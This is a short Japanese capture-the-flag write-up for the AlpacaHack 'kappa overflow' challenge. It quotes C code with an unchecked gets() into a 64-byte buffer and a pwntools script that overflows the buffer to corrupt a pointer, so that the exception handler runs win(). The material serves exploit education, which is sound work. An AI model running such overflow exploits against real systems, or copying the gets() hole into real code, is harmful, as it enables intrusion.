# ■ kappa overflow
[kappa overflow - AlpacaHack](https://alpacahack.com/challenges/kappa-overflow)

## 1. Writeup

`chall.c:#L25-L46`:
```C:chall.c
25 int main() {
26     setvbuf(stdout, NULL, _IONBF, 0);
27     SetUnhandledExceptionFilter(handler);
28
29     struct {
30         char buf[64];
31         volatile int *target;
32     } cache;
33
34     int dummy = 0;
35     cache.target = &dummy;
36
37     puts("Input:");
38     fflush(stdout);
39
40     gets(cache.buf);
41
42     *cache.target = 1;
43
44     puts("OK");
45     return 0;
46 }
```

- `chall.c:#40` で `cache.buf` に入力するが, サイズ(`chall.c:#30`:`char buf[64];`)についての検証が行われていない.
- `chall.c:#42` では アドレス `cache.target` に `1` を代入する動作をしている.

以上のことから, `cache.buf`への入力でBOFを起こし, アドレス値 `cache.target` をアクセス不可のアドレスにすることでAccess Violation例外を発生させることで `win()` を実行できる.

`solve.py`:
```python:solve.py
 1 from pwn import *
 2 
 3 context(os='linux', arch='amd64')
 4 
 5 HOST = "localhost"
 6 PORT = 1337
 7 
 8 io = remote(HOST, PORT)
 9 
10 def exploit():
11  io.sendafterline(b"Input:", b"A"*67)
12 	io.interactive()
13 
14 if __name__ == "__main__":
15 	exploit()
```
